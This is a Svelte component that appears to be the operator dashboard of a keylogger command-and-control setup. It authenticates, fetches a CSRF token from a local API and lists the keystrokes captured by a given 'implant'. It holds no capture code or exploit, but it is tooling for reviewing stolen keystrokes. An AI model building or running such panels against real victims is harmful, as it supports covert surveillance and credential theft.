<script>
  import { onMount } from 'svelte';
  import { navigate } from 'svelte-routing';
  import { isAuthenticated, user, checkAuth, logout } from './authStore';

  let keylogData = null;
  let error = null;

  let urlParams = new URLSearchParams(window.location.search);
  let implantId = urlParams.get('implantId');

  // Extract the ID from the route parameters

  onMount(async () => {
    // Check if the user is authenticated
    console.log("checking auth");
    await checkAuth();

    if ($isAuthenticated && $user) {
      console.log("checked auth");
      await fetchImplantDetails();
    } else {
      navigate('/login');
    }
  });

const fetchCsrfToken = async () => {
  try {
    const res = await fetch('http://localhost:5000/api/csrf-token', {
      credentials: 'include',
    });
    if (res.ok) {
      const data = await res.json();
      const csrfToken = res.headers.get('X-CSRFToken');
      return csrfToken;
    } else {
      throw new Error('Failed to fetch CSRF token.');
    }
  } catch (err) {
    console.error(err);
    error = 'Error fetching CSRF token.';
  }
};

const fetchImplantDetails = async () => {
  try {
    console.log("Getting implant...");
    console.log(implantId);

    // Fetch CSRF token
    const csrfToken = await fetchCsrfToken();
    if (!csrfToken) {
      throw new Error('CSRF token not available');
    }

    const res = await fetch('http://localhost:5000/api/implant', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrfToken, // Include the CSRF token
      },
      body: JSON.stringify({ implantId: implantId }),
    });
    if (!res.ok) {
      throw new Error('Failed to fetch implant details.');
    }
    keylogData = await res.json();
    console.log(keylogData);
  } catch (err) {
    console.error(err);
    error = 'Error fetching implant details.';
  }
};
</script>

{#if $isAuthenticated && $user}
  {#if error}
    <p>{error}</p>
  {:else if keylogData}
    <h1>Keylog Details for ID: {implantId}</h1>
    <table>
      <thead>
        <tr>
          <th>id</th>
          <th>Timestamp</th>
          <th>Text</th>
        </tr>
      </thead>
    <tbody>
      {#each keylogData as keylog}
        <tr>
          <td>{keylog.id}</td>
          <td>{keylog.timestamp}</td>
          <td>{keylog.real}</td>
        </tr>
      {/each}
    </tbody>
    </table>
    <button on:click={logout}>Logout</button>
  {:else}
    <p>Loading implant details...</p>
  {/if}
{:else}
  <p>Loading...</p>
{/if}

